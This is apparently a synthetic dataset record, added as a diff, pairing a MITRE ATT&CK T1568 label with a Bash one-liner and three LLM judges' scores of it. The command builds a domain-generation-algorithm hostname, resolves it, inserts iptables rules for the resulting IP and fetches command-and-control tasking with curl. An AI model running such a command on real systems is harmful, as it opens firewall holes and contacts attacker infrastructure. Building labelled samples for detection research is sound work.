@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "bash -c 'base=$(date -u +%s | sha256sum | cut -c1-6).rotor.net; cname=$(dig +short CNAME \"$base\" | tail -n1); target=${cname:-$base}; ip=$(dig +short A \"$target\" | shuf -n1); if [ -n \"$ip\" ]; then port=$(awk \"BEGIN{srand(); print int(1024+rand()*48000)}\"); iptables -I OUTPUT -p tcp -d \"$ip\" --dport \"$port\" -j ACCEPT; iptables -I INPUT -p tcp -s \"$ip\" --sport \"$port\" -j ACCEPT; curl -fsS --retry 0 \"http://$target:$port/task\"; fi'",
+  "explanation": "Leverages CNAME indirection to dynamically pivot to a rotating endpoint, resolves to an IP, permits the IP:port via iptables, and fetches tasks over an unusual port.",
+  "rationale_steps": [
+    "Create DGA subdomain",
+    "Follow CNAME to discover the current target",
+    "Resolve target A record to get an IP",
+    "Insert iptables rules for that dynamic IP and random port",
+    "Fetch tasking data using curl on the resolved host"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-10f87baa-4bcb3863",
+  "source_prompt_hash": "10f87baa",
+  "timestamp_utc": "2025-09-30T09:41:35.067898Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quotes and command separators with valid flags and substitutions make it well-formed and parseable by bash.",
+        "semantic_score": 4,
+        "semantic_justification": "Implements DGA-like domain generation with CNAME pivot and A-record resolution consistent with T1568, but iptables changes require root and the locally random port likely won’t match the server, reducing realism.",
+        "combined_score": 4.5,
+        "confidence": 0.82,
+        "timestamp": "2025-10-02T05:07:53.597921Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quotes, proper semicolons as separators, valid flag usage for dig/curl/iptables/awk, and correct bash variable expansion throughout.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements T1568 dynamic resolution by generating a time-seeded domain, using CNAME indirection for endpoint rotation, randomly selecting an IP from DNS results, dynamically choosing a high port via awk/srand, modifying iptables to permit the connection, and fetching tasks — all hallmarks of dynamic C2 resolution with fast-flux/CNAME pivoting.",
+        "combined_score": 5.0,
+        "confidence": 0.93,
+        "timestamp": "2026-02-19T00:17:20.867879Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed, uses correct bash parameter expansion, valid tool flags, and properly nested command substitutions.",
+        "semantic_score": 4,
+        "semantic_justification": "The command effectively emulates DGA and dynamic resolution behaviors, although the use of 'iptables' contradicts the 'Privilege: None' metadata as it requires root access.",
+        "combined_score": 4.5,
+        "confidence": 1.0,
+        "timestamp": "2026-02-19T00:17:23.674175Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
